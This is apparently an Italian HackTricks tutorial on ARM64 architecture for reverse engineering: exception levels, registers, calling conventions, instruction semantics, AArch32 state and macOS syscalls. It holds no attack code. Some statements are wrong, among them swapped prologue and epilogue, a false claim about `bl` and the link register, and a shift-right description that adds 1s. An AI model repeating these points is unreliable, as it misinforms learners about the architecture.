# Introduzione ad ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Livelli di eccezione - EL (ARM64v8)**

Nell'architettura ARMv8, i livelli di esecuzione, noti come Exception Levels (EL), definiscono il livello di privilegio e le funzionalità dell'ambiente di esecuzione. Esistono quattro livelli di eccezione, da EL0 a EL3, ognuno con uno scopo diverso:

1. **EL0 - User Mode**:
- È il livello con meno privilegi e viene utilizzato per eseguire il normale codice delle applicazioni.
- Le applicazioni in esecuzione a EL0 sono isolate tra loro e dal software di sistema, migliorando sicurezza e stabilità.
2. **EL1 - Operating System Kernel Mode**:
- La maggior parte dei kernel dei sistemi operativi viene eseguita a questo livello.
- EL1 ha più privilegi di EL0 e può accedere alle risorse di sistema, ma con alcune restrizioni per garantire l'integrità del sistema. Si passa da EL0 a EL1 con l'istruzione SVC.
3. **EL2 - Hypervisor Mode**:
- Questo livello viene utilizzato per la virtualizzazione. Un hypervisor in esecuzione a EL2 può gestire più sistemi operativi (ognuno nel proprio EL1) sulla stessa macchina fisica.
- EL2 fornisce funzionalità per l'isolamento e il controllo degli ambienti virtualizzati.
- Le applicazioni per macchine virtuali, come Parallels, possono quindi usare `hypervisor.framework` per interagire con EL2 ed eseguire macchine virtuali senza necessitare di estensioni del kernel.
- Per passare da EL1 a EL2 viene utilizzata l'istruzione `HVC`.
4. **EL3 - Secure Monitor Mode**:
- È il livello con più privilegi e viene spesso utilizzato per il secure boot e gli ambienti di esecuzione trusted.
- EL3 può gestire e controllare gli accessi tra stati secure e non-secure (come secure boot, trusted OS, ecc.).
- Veniva utilizzato per KPP (Kernel Patch Protection) in macOS, ma non viene più utilizzato.
- Apple non usa più EL3.
- Il passaggio a EL3 viene normalmente effettuato tramite l'istruzione `SMC` (Secure Monitor Call).

L'uso di questi livelli consente di gestire in modo strutturato e sicuro i diversi aspetti del sistema, dalle applicazioni utente al software di sistema con più privilegi. L'approccio di ARMv8 ai livelli di privilegio aiuta a isolare efficacemente i diversi componenti del sistema, migliorandone sicurezza e robustezza.

## **Registri (ARM64v8)**

ARM64 dispone di **31 registri general-purpose**, denominati da `x0` a `x30`. Ognuno può contenere un valore di **64 bit** (8 byte). Per le operazioni che richiedono solo valori a 32 bit, gli stessi registri possono essere utilizzati in modalità a 32 bit con i nomi w0 fino a w30.

1. **Da `x0`** a **`x7`** - Sono generalmente utilizzati come registri scratch e per passare parametri alle subroutine.
- **`x0`** contiene anche il valore restituito da una funzione
2. **`x8`** - Nel kernel Linux, `x8` viene utilizzato come numero della system call per l'istruzione `svc`. **In macOS viene utilizzato x16!**
3. **Da `x9`** a **`x15`** - Altri registri temporanei, spesso utilizzati per le variabili locali.
4. **`x16`** e **`x17`** - **Intra-procedural Call Registers**. Registri temporanei per valori immediati. Vengono utilizzati anche per chiamate indirette a funzioni e stub PLT (Procedure Linkage Table).
- **`x16`** viene utilizzato come **numero della system call** per l'istruzione **`svc`** in **macOS**.
5. **`x18`** - **Platform register**. Può essere utilizzato come registro general-purpose, ma su alcune piattaforme è riservato a usi specifici: puntatore al thread environment block corrente in Windows oppure puntatore alla **struttura task attualmente in esecuzione nel kernel Linux**.
6. **Da `x19`** a **`x28`** - Sono registri callee-saved. Una funzione deve preservare i valori di questi registri per il chiamante, quindi vengono salvati nello stack e recuperati prima di tornare al chiamante.
7. **`x29`** - **Frame pointer**, utilizzato per tenere traccia dello stack frame. Quando viene creato un nuovo stack frame perché viene chiamata una funzione, il registro **`x29`** viene **salvato nello stack** e l'indirizzo del nuovo frame pointer (l'indirizzo di **`sp`**) viene **salvato in questo registro**.
- Questo registro può essere usato anche come **registro general-purpose**, sebbene venga normalmente utilizzato come riferimento alle **variabili locali**.
8. **`x30`** o **`lr`** - **Link register**. Contiene l'**indirizzo di ritorno** quando viene eseguita un'istruzione `BL` (Branch with Link) o `BLR` (Branch with Link to Register), memorizzando il valore di **`pc`** in questo registro.
- Può essere utilizzato anche come qualsiasi altro registro.
- Se la funzione corrente deve chiamare una nuova funzione e quindi sovrascrivere `lr`, lo salva nello stack all'inizio: questa è l'epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> salva `fp` e `lr`, crea spazio e imposta il nuovo `fp`) e lo recupera alla fine: questo è il prologue (`ldp x29, x30, [sp], #48; ret` -> recupera `fp` e `lr` e ritorna).
9. **`sp`** - **Stack pointer**, utilizzato per tenere traccia della cima dello stack.
- Il valore di **`sp`** deve essere sempre mantenuto almeno con un'**alignment** a **quadword**, altrimenti può verificarsi un'eccezione di alignment.
10. **`pc`** - **Program counter**, che punta all'istruzione successiva. Questo registro può essere aggiornato solo tramite generazione di eccezioni, ritorni da eccezioni e branch. Le uniche istruzioni ordinarie che possono leggere questo registro sono le istruzioni branch with link (BL, BLR), che salvano l'indirizzo di **`pc`** in **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Nella forma a **32** bit viene chiamato anche **`wzr`**. Può essere utilizzato per ottenere facilmente il valore zero (operazione comune) o per eseguire confronti usando **`subs`**, come **`subs XZR, Xn, #10`**, scartando i dati risultanti (in **`xzr`**).

I registri **`Wn`** sono la versione a **32 bit** del registro **`Xn`**.

> [!TIP]
> I registri da X0 a X18 sono volatile, cioè i loro valori possono essere modificati da chiamate a funzioni e interrupt. I registri da X19 a X28 sono invece non-volatile, quindi i loro valori devono essere preservati durante le chiamate a funzioni ("callee saved").

### Registri SIMD e floating-point

Inoltre, esistono altri **32 registri di lunghezza pari a 128 bit**, utilizzabili nelle operazioni SIMD (single instruction multiple data) ottimizzate e per eseguire calcoli floating-point. Questi sono chiamati registri Vn, anche se possono operare a **64**, **32**, **16** e **8** bit; in tal caso vengono chiamati **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** e **`Bn`**.

### Registri di sistema

**Esistono centinaia di registri di sistema**, chiamati anche special-purpose registers (SPRs), utilizzati per **monitorare** e **controllare** il comportamento dei **processori**.\
Possono essere letti o impostati solo tramite le istruzioni speciali dedicate **`mrs`** e **`msr`**.

I registri speciali **`TPIDR_EL0`** e **`TPIDDR_EL0`** si trovano comunemente durante il reverse engineering. Il suffisso `EL0` indica il **livello minimo di eccezione** dal quale il registro può essere accessibile (in questo caso EL0 è il normale livello di eccezione (privilegio) con cui vengono eseguiti i programmi normali).\
Vengono spesso utilizzati per memorizzare l'**indirizzo base dell'area di thread-local storage** in memoria. Di solito il primo è leggibile e scrivibile dai programmi in esecuzione a EL0, mentre il secondo può essere letto da EL0 e scritto da EL1 (come il kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** contiene diversi componenti del processo serializzati nel registro speciale visibile al sistema operativo **`SPSR_ELx`**, dove X rappresenta il **livello di permesso** dell'eccezione **generata** (ciò consente di recuperare lo stato del processo al termine dell'eccezione).\
Questi sono i campi accessibili:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- I flag di condizione **`N`**, **`Z`**, **`C`** e **`V`**:
- **`N`** indica che l'operazione ha prodotto un risultato negativo
- **`Z`** indica che l'operazione ha prodotto zero
- **`C`** indica che l'operazione ha prodotto un carry
- **`V`** indica che l'operazione ha prodotto un overflow con segno:
- La somma di due numeri positivi produce un risultato negativo.
- La somma di due numeri negativi produce un risultato positivo.
- Nella sottrazione, quando un numero negativo grande viene sottratto da un numero positivo più piccolo (o viceversa) e il risultato non può essere rappresentato nell'intervallo della dimensione in bit fornita.
- Ovviamente il processore non sa se l'operazione è signed o unsigned, quindi controllerà C e V nelle operazioni e indicherà se si è verificato un carry nel caso signed o unsigned.

> [!WARNING]
> Non tutte le istruzioni aggiornano questi flag. Alcune, come **`CMP`** o **`TST`**, lo fanno; lo fanno anche quelle con suffisso s, come **`ADDS`**.

- Il flag della larghezza corrente del **registro (`nRW`)**: se il flag contiene il valore 0, il programma verrà eseguito nello stato di esecuzione AArch64 alla ripresa.
- L'**Exception Level** corrente (**`EL`**): un programma normale in esecuzione a EL0 avrà valore 0
- Il flag di **single stepping** (**`SS`**): viene utilizzato dai debugger per eseguire un singolo step impostando il flag SS a 1 all'interno di **`SPSR_ELx`** tramite un'eccezione. Il programma eseguirà uno step e genererà un'eccezione di single step.
- Il flag di stato di **illegal exception** (**`IL`**): viene utilizzato per indicare quando un software privilegiato esegue un trasferimento non valido tra exception level; il flag viene impostato a 1 e il processore genera un'eccezione di illegal state.
- I flag **`DAIF`**: consentono a un programma privilegiato di mascherare selettivamente determinate eccezioni esterne.
- Se **`A`** è 1, verranno generati **asynchronous aborts**. **`I`** configura la risposta agli **Interrupts Requests** (IRQ) hardware esterni, mentre F è relativo alle **Fast Interrupt Requests** (FIR).
- I flag di selezione dello stack pointer (**`SPS`**): i programmi privilegiati in esecuzione a EL1 e superiori possono alternare l'uso del proprio registro stack pointer e di quello user-model (ad esempio tra `SP_EL1` e `EL0`). Questo cambio viene eseguito scrivendo nel registro speciale **`SPSel`**. Non può essere effettuato da EL0.

## **Calling Convention (ARM64v8)**

La calling convention ARM64 specifica che i **primi otto parametri** di una funzione vengono passati nei registri **`x0`** fino a **`x7`**. I parametri **aggiuntivi** vengono passati sullo **stack**. Il valore di **return** viene passato nel registro **`x0`**, oppure anche in **`x1`** **se è lungo 128 bit**. I registri da **`x19`** a **`x30`** e **`sp`** devono essere **preservati** durante le chiamate a funzioni.

Quando si legge una funzione in assembly, bisogna cercare il **function prologue e l'epilogue**. Il **prologue** normalmente comporta il **salvataggio del frame pointer (`x29`)**, l'impostazione di un **nuovo frame pointer** e l'**allocazione di spazio nello stack**. L'**epilogue** normalmente comporta il **ripristino del frame pointer salvato** e il **ritorno** dalla funzione.

### Calling Convention in Swift

Swift ha una propria **calling convention**, descritta in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Istruzioni comuni (ARM64v8)**

Le istruzioni ARM64 hanno generalmente il **formato `opcode dst, src1, src2`**, dove **`opcode`** è l'**operazione** da eseguire (come `add`, `sub`, `mov`, ecc.), **`dst`** è il registro di **destinazione** in cui verrà salvato il risultato e **`src1`** e **`src2`** sono i registri **sorgente**. Al posto dei registri sorgente possono essere utilizzati anche valori immediati.

- **`mov`**: **Sposta** un valore da un **registro** a un altro.
- Esempio: `mov x0, x1` — Sposta il valore da `x1` a `x0`.
- **`ldr`**: **Carica** un valore dalla **memoria** in un **registro**.
- Esempio: `ldr x0, [x1]` — Carica in `x0` un valore dalla posizione di memoria indicata da `x1`.
- **Modalità offset**: un offset applicato al puntatore originale è indicato, ad esempio:
- `ldr x2, [x1, #8]`, carica in x2 il valore da x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, carica in x2 un oggetto dall'array x0, dalla posizione x1 (indice) \* 4
- **Modalità pre-indexed**: applica i calcoli all'origine, ottiene il risultato e salva anche la nuova origine nell'origine.
- `ldr x2, [x1, #8]!`, carica `x1 + 8` in `x2` e salva in x1 il risultato di `x1 + 8`
- `str lr, [sp, #-4]!`, salva il link register in sp e aggiorna il registro sp
- **Modalità post-index**: è simile alla precedente, ma prima accede all'indirizzo di memoria e poi calcola e salva l'offset.
- `ldr x0, [x1], #8`, carica `x1` in `x0` e aggiorna x1 con `x1 + 8`
- **Indirizzamento PC-relative**: in questo caso l'indirizzo da caricare viene calcolato rispetto al registro PC
- `ldr x1, =_start`, carica in x1 l'indirizzo relativo al PC corrente in cui inizia il simbolo `_start`.
- **`str`**: **Salva** un valore da un **registro** nella **memoria**.
- Esempio: `str x0, [x1]` — Salva il valore in `x0` nella posizione di memoria indicata da `x1`.
- **`ldp`**: **Load Pair of Registers**. Questa istruzione **carica due registri** da posizioni di memoria **consecutive**. L'indirizzo di memoria viene normalmente formato aggiungendo un offset al valore contenuto in un altro registro.
- Esempio: `ldp x0, x1, [x2]` — Carica `x0` e `x1` dalle posizioni di memoria `x2` e `x2 + 8`, rispettivamente.
- **`stp`**: **Store Pair of Registers**. Questa istruzione **salva due registri** in posizioni di memoria **consecutive**. L'indirizzo di memoria viene normalmente formato aggiungendo un offset al valore contenuto in un altro registro.
- Esempio: `stp x0, x1, [sp]` — Salva `x0` e `x1` nelle posizioni di memoria `sp` e `sp + 8`, rispettivamente.
- `stp x0, x1, [sp, #16]!` — Salva `x0` e `x1` nelle posizioni di memoria `sp+16` e `sp + 24`, rispettivamente, e aggiorna `sp` con `sp+16`.
- **`add`**: **Somma** i valori di due registri e salva il risultato in un registro.
- Sintassi: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destinazione
- Xn2 -> Operando 1
- Xn3 | #imm -> Operando 2 (registro o valore immediato)
- \[shift #N | RRX] -> Esegue uno shift o chiama RRX
- Esempio: `add x0, x1, x2` — Somma i valori in `x1` e `x2` e salva il risultato in `x0`.
- `add x5, x5, #1, lsl #12` — Equivale a 4096 (uno shift di 1 per 12 volte) -> 1 0000 0000 0000 0000
- **`adds`** esegue una `add` e aggiorna i flag
- **`sub`**: **Sottrae** i valori di due registri e salva il risultato in un registro.
- Vedere la **sintassi** di **`add`**.
- Esempio: `sub x0, x1, x2` — Sottrae il valore in `x2` da `x1` e salva il risultato in `x0`.
- **`subs`** è simile a sub, ma aggiorna i flag
- **`mul`**: **Moltiplica** i valori di **due registri** e salva il risultato in un registro.
- Esempio: `mul x0, x1, x2` — Moltiplica i valori in `x1` e `x2` e salva il risultato in `x0`.
- **`div`**: **Divide** il valore di un registro per quello di un altro e salva il risultato in un registro.
- Esempio: `div x0, x1, x2` — Divide il valore in `x1` per quello in `x2` e salva il risultato in `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: aggiunge 0 alla fine spostando in avanti gli altri bit (moltiplicazione per n volte 2)
- **Logical shift right**: aggiunge 1 all'inizio spostando indietro gli altri bit (divisione per n volte 2 in unsigned)
- **Arithmetic shift right**: come **`lsr`**, ma invece di aggiungere 0, se il bit più significativo è 1 vengono aggiunti **1** (divisione per n volte 2 in signed)
- **Rotate right**: come **`lsr`**, ma ciò che viene rimosso da destra viene aggiunto a sinistra
- **Rotate Right with Extend**: come **`ror`**, ma usa il carry flag come "bit più significativo". Il carry flag viene spostato al bit 31 e il bit rimosso al carry flag.
- **`bfm`**: **Bit Filed Move**; queste operazioni **copiano i bit `0...n`** da un valore e li posizionano nelle posizioni **`m..m+n`**. **`#s`** specifica la posizione del bit più a sinistra e **`#r`** la quantità di rotate right.
- Bitfiled move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** copia un bitfield da un registro e lo copia in un altro registro.
- **`BFI X1, X2, #3, #4`** Inserisce 4 bit da X2 a partire dal terzo bit di X1
- **`BFXIL X1, X2, #3, #4`** Estrae quattro bit da X2 a partire dal terzo bit e li copia in X1
- **`SBFIZ X1, X2, #3, #4`** Estende con segno 4 bit da X2 e li inserisce in X1 a partire dalla posizione 3, azzerando i bit a destra
- **`SBFX X1, X2, #3, #4`** Estrae 4 bit da X2 a partire dal bit 3, li estende con segno e inserisce il risultato in X1
- **`UBFIZ X1, X2, #3, #4`** Estende con zeri 4 bit da X2 e li inserisce in X1 a partire dalla posizione 3, azzerando i bit a destra
- **`UBFX X1, X2, #3, #4`** Estrae 4 bit da X2 a partire dal bit 3 e inserisce in X1 il risultato esteso con zeri.
- **Sign Extend To X:** estende il segno (oppure aggiunge solo 0 nella versione unsigned) di un valore per poter eseguire operazioni con esso:
- **`SXTB X1, W2`** Estende il segno di un byte **da W2 a X1** (`W2` è metà di `X2`) per riempire i 64 bit
- **`SXTH X1, W2`** Estende il segno di un numero a 16 bit **da W2 a X1** per riempire i 64 bit
- **`SXTW X1, W2`** Estende il segno di un byte **da W2 a X1** per riempire i 64 bit
- **`UXTB X1, W2`** Aggiunge 0 (unsigned) a un byte **da W2 a X1** per riempire i 64 bit
- **`extr`:** estrae bit da una **coppia specificata di registri concatenati**.
- Esempio: `EXTR W3, W2, W1, #3` concatenerà **W1+W2** e preleverà **dal bit 3 di W2 fino al bit 3 di W1**, salvando il risultato in W3.
- **`cmp`**: **Confronta** due registri e imposta i flag di condizione. È un **alias di `subs`** che imposta il registro di destinazione sul registro zero. È utile per verificare se `m == n`.
- Supporta la **stessa sintassi di `subs`**
- Esempio: `cmp x0, x1` — Confronta i valori in `x0` e `x1` e imposta di conseguenza i flag di condizione.
- **`cmn`**: operando **Compare negative**. In questo caso è un **alias di `adds`** e supporta la stessa sintassi. È utile per verificare se `m == -n`.
- **`ccmp`**: confronto condizionale; il confronto viene eseguito solo se un confronto precedente era vero e imposta specificamente i bit nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> se x1 != x2 e x3 < x4, salta a func
- Questo perché **`ccmp`** viene eseguito solo se il **precedente `cmp` era `NE`**; in caso contrario, i bit `nzcv` vengono impostati a 0 (e ciò non soddisfa il confronto `blt`).
- Può essere utilizzato anche come `ccmn` (uguale, ma negativo, come `cmp` rispetto a `cmn`).
- **`tst`**: verifica se almeno uno dei valori del confronto è entrambi 1 (funziona come una ANDS senza salvare il risultato). È utile per controllare un registro con un valore e verificare se uno dei bit del registro indicati nel valore è 1.
- Esempio: `tst X1, #7` verifica se uno degli ultimi 3 bit di X1 è 1
- **`teq`**: operazione XOR che scarta il risultato
- **`b`**: branch incondizionato
- Esempio: `b myFunction`
- Si noti che questo non riempie il link register con l'indirizzo di ritorno (non è adatto alle chiamate di subroutine che devono ritornare)
- **`bl`**: **Branch** with link, utilizzato per **chiamare** una **subroutine**. Salva l'**indirizzo di ritorno in `x30`**.
- Esempio: `bl myFunction` — Chiama la funzione `myFunction` e salva l'indirizzo di ritorno in `x30`.
- Si noti che questo non riempie il link register con l'indirizzo di ritorno (non è adatto alle chiamate di subroutine che devono ritornare)
- **`blr`**: **Branch** with Link to Register, utilizzato per **chiamare** una **subroutine** il cui target è **specificato** in un **registro**. Salva l'indirizzo di ritorno in `x30`. (Questo è
- Esempio: `blr x1` — Chiama la funzione il cui indirizzo è contenuto in `x1` e salva l'indirizzo di ritorno in `x30`.
- **`ret`**: ritorna dalla **subroutine**, normalmente utilizzando l'indirizzo in **`x30`**.
- Esempio: `ret` — Ritorna dalla subroutine corrente utilizzando l'indirizzo di ritorno in `x30`.
- **`b.<cond>`**: branch condizionali
- **`b.eq`**: **Branch if equal**, basato sull'istruzione `cmp` precedente.
- Esempio: `b.eq label` — Se l'istruzione `cmp` precedente ha trovato due valori uguali, salta a `label`.
- **`b.ne`**: **Branch if Not Equal**. Questa istruzione controlla i flag di condizione (impostati da una precedente istruzione di confronto) e, se i valori confrontati non erano uguali, esegue un branch verso un label o un indirizzo.
- Esempio: dopo un'istruzione `cmp x0, x1`, `b.ne label` — Se i valori in `x0` e `x1` non erano uguali, salta a `label`.
- **`cbz`**: **Compare and Branch on Zero**. Confronta un registro con zero e, se sono uguali, esegue un branch verso un label o un indirizzo.
- Esempio: `cbz x0, label` — Se il valore in `x0` è zero, salta a `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Confronta un registro con zero e, se non sono uguali, esegue un branch verso un label o un indirizzo.
- Esempio: `cbnz x0, label` — Se il valore in `x0` è diverso da zero, salta a `label`.
- **`tbnz`**: verifica un bit ed esegue un branch se non è zero
- Esempio: `tbnz x0, #8, label`
- **`tbz`**: verifica un bit ed esegue un branch se è zero
- Esempio: `tbz x0, #8, label`
- **Operazioni di selezione condizionale**: operazioni il cui comportamento varia in base ai bit condizionali.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> se vero, X0 = X1; se falso, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> se vero, Xd = Xn; se falso, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> se vero, Xd = Xn + 1; se falso, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> se vero, Xd = Xn; se falso, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> se vero, Xd = NOT(Xn); se falso, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> se vero, Xd = Xn; se falso, Xd = - Xm
- `cneg Xd, Xn, cond` -> se vero, Xd = - Xn; se falso, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> se vero, Xd = 1; se falso, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> se vero, Xd = \<all 1>; se falso, Xd = 0
- **`adrp`**: calcola l'**indirizzo della pagina di un simbolo** e lo salva in un registro.
- Esempio: `adrp x0, symbol` — Calcola l'indirizzo della pagina di `symbol` e lo salva in `x0`.
- **`ldrsw`**: **carica** dalla memoria un valore **signed a 32 bit** e lo **estende con segno a 64 bit**. Viene utilizzato nei comuni casi SWITCH.
- Esempio: `ldrsw x0, [x1]` — Carica un valore signed a 32 bit dalla posizione di memoria indicata da `x1`, lo estende con segno a 64 bit e lo salva in `x0`.
- **`stur`**: **salva il valore di un registro in una posizione di memoria**, utilizzando un offset da un altro registro.
- Esempio: `stur x0, [x1, #4]` — Salva il valore in `x0` nell'indirizzo di memoria che si trova 4 byte oltre l'indirizzo attualmente contenuto in `x1`.
- **`svc`** : esegue una **system call**. È l'acronimo di "Supervisor Call". Quando il processore esegue questa istruzione, **passa dalla user mode alla kernel mode** e salta a una posizione specifica della memoria contenente il codice di gestione delle system call del **kernel**.

- Esempio:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Salvare il link register e il frame pointer nello stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Imposta il nuovo frame pointer**: `mov x29, sp` (imposta il nuovo frame pointer per la funzione corrente)
3. **Alloca spazio nello stack per le variabili locali** (se necessario): `sub sp, sp, <size>` (dove `<size>` è il numero di byte necessari)

### **Epilogo della funzione**

1. **Dealloca le variabili locali** (se ne sono state allocate): `add sp, sp, <size>`
2. **Ripristina il link register e il frame pointer**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (restituisce il controllo al caller usando l'indirizzo nel link register)

## Common Memory Protections di ARM

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## Stato di esecuzione AARCH32

Armv8-A supporta l'esecuzione di programmi a 32-bit. **AArch32** può essere eseguito in uno dei **due instruction set**: **`A32`** e **`T32`**, e può passare dall'uno all'altro tramite **`interworking`**.\
I programmi **Privileged** a 64-bit possono pianificare l'**esecuzione di programmi a 32-bit** eseguendo un trasferimento del livello di eccezione verso il livello a 32-bit con privilegi inferiori.\
Si noti che la transizione da 64-bit a 32-bit avviene con una riduzione del livello di eccezione (per esempio, un programma a 64-bit in EL1 che attiva un programma in EL0). Questo viene eseguito impostando **il bit 4 di** **`SPSR_ELx`**, un registro speciale, **a 1** quando il thread del processo `AArch32` è pronto per essere eseguito, mentre il resto di `SPSR_ELx` memorizza il CPSR del programma **`AArch32`**. Quindi, il processo privilegiato chiama l'istruzione **`ERET`**, così il processore passa ad **`AArch32`**, entrando in A32 o T32 a seconda del CPSR**.**

L'**`interworking`** avviene usando i bit J e T del CPSR. `J=0` e `T=0` indicano **`A32`**, mentre `J=0` e `T=1` indicano **T32**. In pratica, ciò si traduce nell'impostare il **bit meno significativo a 1** per indicare che l'instruction set è T32.\
Questo viene impostato durante le **interworking branch instructions,** ma può anche essere impostato direttamente con altre istruzioni quando il PC è impostato come destination register. Esempio:

Un altro esempio:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

Esistono 16 registri a 32 bit (r0-r15). **Da r0 a r14** possono essere utilizzati per **qualsiasi operazione**, tuttavia alcuni di essi sono generalmente riservati:

- **`r15`**: Program counter (sempre). Contiene l'indirizzo della prossima istruzione. In A32, current + 8; in T32, current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (lo stack è sempre allineato a 16 byte)
- **`r14`**: Link Register

Inoltre, i registri vengono salvati nei **`banked registries`**, ovvero aree che memorizzano i valori dei registri e consentono di eseguire un **fast context switching** durante la gestione delle eccezioni e le operazioni privilegiate, evitando di dover salvare e ripristinare manualmente i registri ogni volta.\
Questo avviene **salvando lo stato del processore dal `CPSR` al `SPSR`** della modalità del processore a cui viene trasferita l'eccezione. Al ritorno dall'eccezione, il **`CPSR`** viene ripristinato dal **`SPSR`**.

### CPSR - Current Program Status Register

In AArch32, il CPSR funziona in modo simile a **`PSTATE`** in AArch64 e viene inoltre memorizzato in **`SPSR_ELx`** quando viene generata un'eccezione, per ripristinare successivamente l'esecuzione:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

I campi sono suddivisi in alcuni gruppi:

- Application Program Status Register (APSR): flag aritmetici, accessibili da EL0
- Execution State Registers: comportamento del processo (gestito dal sistema operativo).

#### Application Program Status Register (APSR)

- I flag **`N`**, **`Z`**, **`C`**, **`V`** (proprio come in AArch64)
- Il flag **`Q`**: viene impostato a 1 ogni volta che si verifica una **integer saturation** durante l'esecuzione di una specialized saturating arithmetic instruction. Una volta impostato a **`1`**, mantiene questo valore finché non viene impostato manualmente a 0. Inoltre, non esiste alcuna istruzione che ne controlli implicitamente il valore: è necessario leggerlo manualmente.
- Flag **`GE`** (Greater than or equal): vengono utilizzati nelle operazioni SIMD (Single Instruction, Multiple Data), come "parallel add" e "parallel subtract". Queste operazioni consentono di elaborare più punti dati con una singola istruzione.

Ad esempio, l'istruzione **`UADD8`** **somma quattro coppie di byte** (da due operandi a 32 bit) in parallelo e memorizza i risultati in un registro a 32 bit. Successivamente **imposta i flag `GE` nell'`APSR`** in base a questi risultati. Ogni flag GE corrisponde a una delle somme di byte e indica se la somma per quella coppia di byte **ha generato un overflow**.

L'istruzione **`SEL`** utilizza questi flag GE per eseguire azioni condizionali.

#### Execution State Registers

- I bit **`J`** e **`T`**: **`J`** dovrebbe essere 0; se **`T`** è 0 viene utilizzato l'instruction set A32, mentre se è 1 viene utilizzato T32.
- **IT Block State Register** (`ITSTATE`): sono i bit da 10-15 e 25-26. Memorizzano le condizioni per le istruzioni all'interno di un gruppo preceduto da **`IT`**.
- Bit **`E`**: indica l'**endianness**.
- **Mode and Exception Mask Bits** (0-4): determinano lo stato di esecuzione corrente. Il quinto indica se il programma viene eseguito a 32 bit (1) o a 64 bit (0). Gli altri quattro rappresentano la **exception mode** attualmente in uso (quando si verifica un'eccezione e questa viene gestita). Il valore impostato **indica la priorità corrente** nel caso in cui venga generata un'altra eccezione mentre questa è in fase di gestione.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: alcune eccezioni possono essere disabilitate utilizzando i bit **`A`**, `I`, `F`. Se **`A`** è 1, significa che verranno generati **asynchronous aborts**. **`I`** configura la risposta alle **Interrupts Requests** (IRQ) hardware esterne, mentre **`F`** è relativo alle **Fast Interrupt Requests** (FIR).

## macOS

### BSD syscalls

Consulta [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) oppure esegui `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. Le BSD syscalls avranno **x16 > 0**.

### Mach Traps

Nel file [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) puoi trovare la `mach_trap_table` e nel file [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) i prototipi. Il numero massimo di Mach traps è `MACH_TRAP_TABLE_COUNT` = 128. Le Mach traps avranno **x16 < 0**, quindi è necessario chiamare i numeri dell'elenco precedente con un **segno meno**: **`_kernelrpc_mach_vm_allocate_trap`** è **`-10`**.

Puoi anche controllare **`libsystem_kernel.dylib`** in un disassembler per trovare come chiamare queste syscall (e quelle BSD):
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Nota che **Ida** e **Ghidra** possono anche decompilare **specifici dylib** dalla cache semplicemente passando la cache.

> [!TIP]
> A volte è più facile controllare il codice **decompilato** di **`libsystem_kernel.dylib`** **invece di** controllare il **codice sorgente**, perché il codice di diverse syscall (BSD e Mach) viene generato tramite script (controlla i commenti nel codice sorgente), mentre nel dylib puoi trovare cosa viene chiamato.

### chiamate machdep

XNU supporta un altro tipo di chiamate chiamate machine dependent. I numeri di queste chiamate dipendono dall'architettura e né le chiamate né i numeri sono garantiti come costanti.

### comm page

Questa è una pagina di memoria di proprietà del kernel mappata nello spazio degli indirizzi di ogni processo utente. È pensata per rendere la transizione dalla user mode al kernel space più veloce rispetto all'utilizzo delle syscall per i servizi del kernel usati così frequentemente che questa transizione sarebbe molto inefficiente.

Ad esempio, la chiamata `gettimeofdate` legge direttamente il valore di `timeval` dalla comm page.

### objc_msgSend

È molto comune trovare questa funzione utilizzata nei programmi Objective-C o Swift. Questa funzione consente di chiamare un metodo di un oggetto Objective-C.

Parametri ([maggiori informazioni nella documentazione](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Puntatore all'istanza
- x1: op -> Selector del metodo
